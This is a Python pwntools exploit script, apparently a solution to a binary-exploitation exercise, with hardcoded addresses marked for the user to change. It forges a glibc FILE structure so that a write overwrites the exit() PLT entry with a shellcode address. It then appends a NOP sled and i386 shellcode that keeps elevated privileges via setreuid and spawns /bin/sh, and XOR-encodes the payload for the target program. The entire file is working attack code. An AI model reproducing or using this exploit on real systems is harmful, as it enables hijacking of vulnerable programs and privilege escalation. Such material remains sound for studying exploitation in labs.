#!/usr/bin/python3
import sys
from pwn import *

# values to modify
FILE_struct_address  = 0xffffd158
plt_exit_address = 0x0804b208
shellcode_address = 0xffffd204

write_buffer_address = plt_exit_address - len('file : ') # because we print 'file : shellcode_address', and i want the shellcode address to override plt-exit-address

_IO_write_base = write_buffer_address
_IO_write_ptr = write_buffer_address
_IO_write_end = write_buffer_address+400

payload = p32(shellcode_address)

payload += p32(0xfbad3484) + b'\x00\x00\x00\x00' * 3
payload += p32(_IO_write_base) + p32(_IO_write_ptr) + p32(_IO_write_end) 
payload += b'\x00\x00\x00\x00' * 6 + p32(0xf7faeca0) + p32(0x00000003) +  b'\x00\x00\x00\x00' * 3 
payload += p32(0x0804c238) + p32(0xffffffff) * 2 + b'\x00\x00\x00\x00' 
payload+= p32(0x0804c244) + b'\x00\x00\x00\x00' * 14

shellcode = (
    b"\x6a\x31"  # push 0x31 (49)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80 (geteuid())

    b"\x89\xc3"  # mov ebx, eax (uid)
    b"\x89\xd9"  # mov ecx, ebx
    b"\x6a\x46"  # push 0x46 (70)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80, setreuid(geteuid(), geteuid())

    b"\x31\xd2"  # xor edx, edx
    b"\x52"      # push edx, which is \0
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"  # mov ebx, esp (now ebx contains: "/bin//sh",\x00)

    b"\x52"      # push edx (push NULL into stack)
    b"\x53"      # push ebx (push pathname)
    b"\x89\xe1"  # mov ecx, esp (ecx is argv)

    b"\xb0\x0b"  # mov al, 0x0b (11)
    b"\xcd\x80"  # int 0x80 (execv("/bin//sh", argv))

        # mv eax, 1         ; system call number (sys_exit)
    b"\x6a\x01"  # push 1
    b"\x58"      # pop eax (sys_exit)
    # int 0x80
    b"\xcd\x80"  # int 0x80 (exit())
)


payload += b'\x90'*(256-len(shellcode)-len(payload))  
payload += shellcode

payload += p32(FILE_struct_address)

payload = bytes([byte^0x2A for byte in payload]) # reverse memprob

payload = b'file' + b' ' + payload
sys.stdout.buffer.write(payload)
